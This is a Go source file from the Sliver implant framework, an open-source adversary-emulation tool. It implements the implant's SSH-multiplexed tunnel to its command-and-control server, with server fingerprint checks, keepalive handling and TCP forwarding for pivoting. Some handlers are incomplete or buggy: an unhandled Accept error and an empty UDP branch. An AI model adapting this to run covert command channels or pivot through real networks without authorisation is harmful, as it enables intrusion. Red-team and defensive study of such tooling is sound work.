package comm

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"crypto/sha256"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"net"
	"sync"
	"time"

	"github.com/golang/protobuf/proto"
	"golang.org/x/crypto/ssh"

	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/sliver/constants"
)

var (
	// Used to authenticate the server when using SSH.
	serverKeyFingerprint = `{{.Config.ServerFingerprint}}`
)

// Comm - Wrapper around a net.Conn, adding SSH infrastructure for encryption and tunneling
// to an implant. To be noted, this Comm can be either in a client or in a server position:
// C2 Server ---> Implant Mux (here we are the server accepting SSH)
// Implant Mux --> Pivoted implant Mux (here we are the client)
type Comm struct {
	// Core
	SessionID     uint32            // Any multiplexer's physical connection is tied to an implant.
	RemoteAddress string            // The multiplexer may be tied to a pivoted implant.
	ssh           ssh.Conn          // SSH Connection, that we will mux
	config        *ssh.ClientConfig // We are the talking to the C2 server.
	fingerprint   string            // A key fingerprint to authenticate the server/pivot.

	// Connection management
	requests <-chan *ssh.Request   // Keep alive
	inbound  <-chan ssh.NewChannel // Inbound mux requests
	mutex    *sync.RWMutex         // Concurrency management.
	pending  int                   // Number of actively processed connections.
}

// InitClient - Sets up and start a SSH connection (multiplexer) around a logical connection/stream, or a Session RPC.
func InitClient(conn net.Conn, key []byte) (ss io.ReadWriteCloser, err error) {
	// Return if we don't have what we need.
	if conn == nil {
		return nil, errors.New("net.Conn is nil, cannot init Comm")
	}

	// New SSH multiplexer Comm
	comm := &Comm{mutex: &sync.RWMutex{}}

	// Pepare the SSH conn/security, and set keepalive policies/handlers.
	err = comm.setupAuthClient(key, constants.SliverName)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("failed to setup SSH client connection: %s", err.Error())
		// {{end}}
		return nil, err
	}

	// {{if .Config.Debug}}
	log.Printf("Initiating SSH client connection...")
	// {{end}}

	// We are the client of the C2 server here.
	comm.ssh, comm.inbound, comm.requests, err = ssh.NewClientConn(conn, "", comm.config)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("failed to initiate SSH connection: %s", err.Error())
		// {{end}}
		return
	}

	go comm.serveRequests() // Serve pings & requests with keepalive policies.

	Comms.Add(comm)                // Everything is up and running, register the mux.
	go comm.handleServerIncoming() // Handle requests (pings) and incoming connections in the background.

	return
}

// setupAuthClient - The Comm prepares SSH code and security details for a client connection.
func (comm *Comm) setupAuthClient(key []byte, name string) (err error) {

	// Private key is used to authenticate to the server/pivot.
	signer, err := ssh.ParsePrivateKey(key)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("SSH failed to parse Private Key: %s", err.Error())
		// {{end}}
		return
	}

	comm.config = &ssh.ClientConfig{
		User:            name,                                     // The user is the implant name.
		Auth:            []ssh.AuthMethod{ssh.PublicKeys(signer)}, // Authenticate as the implant.
		HostKeyCallback: comm.verifyServer,                        // Checks the key given by the server/pivot.
	}

	return
}

// verifyServer - Check the server's host key fingerprint. We have an exampled compiled in above.
func (comm *Comm) verifyServer(hostname string, remote net.Addr, key ssh.PublicKey) error {
	expect := serverKeyFingerprint
	if expect == "" {
		return errors.New("No server key fingerprint")
	}

	// calculate the SHA256 hash of an SSH public key
	bytes := sha256.Sum256(key.Marshal())
	got := base64.StdEncoding.EncodeToString(bytes[:])

	_, err := base64.StdEncoding.DecodeString(expect)
	if _, ok := err.(base64.CorruptInputError); ok {
		return fmt.Errorf("MD5 fingerprint (%s), update to SHA256 fingerprint: %s", expect, got)
	} else if err != nil {
		return fmt.Errorf("Error decoding fingerprint: %w", err)
	}
	if got != expect {
		return fmt.Errorf("Invalid fingerprint (%s)", got)
	}

	// {{if .Config.Debug}}
	log.Printf("Fingerprint %s", got)
	// {{end}}
	return nil
}

// handleServerIncoming - Serves all inbound (server -> implant) connections.
func (comm *Comm) handleServerIncoming() {
	// At the end of this function the Comm will be closed, so we clean it up.
	defer func() {
		// {{if .Config.Debug}}
		log.Printf("Closing SSH client connection ...")
		// {{end}}
		err := comm.ssh.Close()
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Error closing SSH connection: %s", err.Error())
			// {{end}}
		}
		// Remove this multiplexer from our active sockets.
		Comms.Remove(comm.RemoteAddress)
	}()

	// For each incoming stream request, process concurrently. Blocking
	for in := range comm.inbound {
		go comm.handleServerInbound(in)
	}
}

// handleConnInbound - Handle, validate and pipe a single logical connection (blocking)
func (comm *Comm) handleServerInbound(ch ssh.NewChannel) {

	// Parse incoming connection request details
	info := &sliverpb.ConnectionInfo{}
	err := proto.Unmarshal(ch.ExtraData(), info)
	if info.ID == "" || err != nil {
		// {{if .Config.Debug}}
		log.Printf("rejected connection: (bad info payload: %s)", info.ID)
		// {{end}}
		return
	}

	// Accept stream and five to route.
	stream, reqs, err := ch.Accept()
	if err != nil {
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("failed to accept stream (ID %s): %s", info.ID, err.Error())
			// {{end}}
		}
	}
	go ssh.DiscardRequests(reqs)

	// Add conn stats.
	comm.pending++
	defer func() {
		comm.pending--
	}()

	// {{if .Config.Debug}}
	log.Printf("Forwarding inbound stream: %s:%d --> %s:%d", info.LHost, info.LPort, info.RHost, info.RPort)
	// {{end}}

	// Depending on the Transport protocol, we handle the stream differently.
	switch info.Transport {
	case sliverpb.TransportProtocol_TCP:
		err := dialTCP(info, stream)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Error dialing TCP: %s:%d -> %s:%d",
				info.LHost, info.LPort, info.RHost, info.RPort)
			// {{end}}
			return
		}
	case sliverpb.TransportProtocol_UDP:
		// If the connection is meant to forward UDP traffic, we have to spawn a new UDP handler.
		// This is because the server will only send (through this stream) UDP traffic meant for
		// the same destination and from the same source address.
		// This is so that it is easier to reproduce a *net.UDPConn at the server's end, for
		// supporting other application-level protocols like QUIC.

	}
}

// handleReverse - A net.Conn and the info of its handler (a listener/dialer)
// is passed to the implant comm and routed back to the server.
func (comm *Comm) handleReverse(h *sliverpb.Handler, conn net.Conn) {

	// Populate the connection info with all details from the handler struct:
	// we assume all fields are good, otherwise the server/implant would have
	// returned an error before spawing the listener/dialer.
	info := &sliverpb.ConnectionInfo{
		ID:          h.ID,
		Transport:   h.Transport,
		Application: h.Application,
		LHost:       h.LHost,
		LPort:       h.LPort,
		RHost:       h.RHost,
		RPort:       h.RPort,
	}
	data, _ := proto.Marshal(info)

	// Create muxed channel and pipe, or close the connection if failure.
	dst, reqs, err := comm.ssh.OpenChannel("handler", data)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to open channel: %s", err.Error())
		// {{end}}
		err = conn.Close()
		return
	}
	go ssh.DiscardRequests(reqs)

	// Pipe the connection.
	transport(conn, dst)
}

// getStream - A handler may request ahead a stream over which to transmit its data.
// The ID given is mandatorily linked to a working abstracted listener on the server.
func (comm *Comm) getStream(h *sliverpb.Handler) io.ReadWriteCloser {

	// Populate the connection info
	info := &sliverpb.ConnectionInfo{
		ID:          h.ID,
		Transport:   h.Transport,
		Application: h.Application,
		LHost:       h.LHost,
		LPort:       h.LPort,
		RHost:       h.RHost,
		RPort:       h.RPort,
	}
	data, _ := proto.Marshal(info)

	// Create muxed channel and return it
	dst, reqs, err := comm.ssh.OpenChannel("handler", data)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to open channel: %s", err.Error())
		// {{end}}
		return nil
	}
	go ssh.DiscardRequests(reqs)

	return dst
}

// serverRequests - Handles all requests coming from the implant comm. (latency checks, close requests, etc.)
func (comm *Comm) serveRequests() {

	for req := range comm.requests {

		// If ping, respond keepalive
		if req.Type == "keepalive" {
			err := req.Reply(true, []byte{})
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("Error replying to request")
				// {{end}}
			}
		}

		// If latency, respond time.Now as string, for double check
		if req.Type == "latency" {
			t := fmt.Sprintf("%d", time.Now().UnixNano())
			err := req.Reply(true, []byte(t))
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("Error replying to request")
				// {{end}}
			}
		}
	}
}

// checkLatency - get latency for this tunnel.
func (comm *Comm) checkLatency() {
	t0 := time.Now()
	_, _, err := comm.ssh.SendRequest("latency", true, []byte{})
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Could not check latency: %s", err.Error())
		// {{end}}
		return
	}
	// {{if .Config.Debug}}
	log.Printf("Latency: %s", time.Since(t0))
	// {{end}}
}
